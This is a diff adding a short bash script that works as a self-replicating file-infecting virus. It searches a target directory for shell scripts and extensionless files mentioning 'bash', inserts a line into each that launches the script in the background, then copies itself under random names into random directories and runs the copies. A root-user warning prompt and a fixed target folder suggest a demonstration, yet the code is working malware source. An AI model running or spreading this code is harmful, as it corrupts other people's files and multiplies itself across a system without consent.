@@ -1,0 +1,52 @@
+#!/usr/bin/env bash
+
+set -o pipefail
+
+if [[ ${EUID} -ne 0 ]]; then
+	target="${HOME}/target"
+else
+	echo "This script is dangerous and may cause damage to your system. Are you sure you want to continue? (y/n)"
+	read -r answer
+	if [[ ${answer} == "y" ]]; then
+		target="/target"
+	else
+		echo "Exiting..."
+		exit 1
+	fi
+fi
+
+word="bash"
+script_path=$(readlink -f "$0")
+line="(${script_path}) &"
+
+check_for_bash_in_file() {
+	find "${target}" -type f \( -name "*.sh" -o ! -name "*.*" \) -print0 | while IFS= read -r -d '' file; do
+		if grep -q "${word}" "${file}"; then
+			append_line_to_file "${file}"
+			clone_file_under_random_name
+		fi
+	done
+}
+
+append_line_to_file() {
+	if ! cmp -s "${file}" "${script_path}"; then
+		if ! grep -Fxq "${line}" "${file}"; then
+			sed -i '2{/^$/d}' "${file}"  # If the second line is empty, delete it
+			sed -i "2i${line}" "${file}" # Insert the new line at the second line
+		fi
+	fi
+}
+
+clone_file_under_random_name() {
+	find_output=$(find "${target}" -type d 2>/dev/null) || exit 1
+	IFS=$'\n' read -d '' -r -a directories <<<"${find_output}"
+	# Select a random directory
+	dir=${directories[RANDOM % ${#directories[@]}]}
+	# Create a temporary file in the random directory
+	random_dir=$(mktemp -d "${dir}/XXXXXXXXXXXX")
+	random_file=$(mktemp "${random_dir}/XXXXXXXXXXXX")
+	cp "${script_path}" "${random_file}" && chmod +x "${random_file}"
+	${random_file}
+}
+
+(check_for_bash_in_file) &
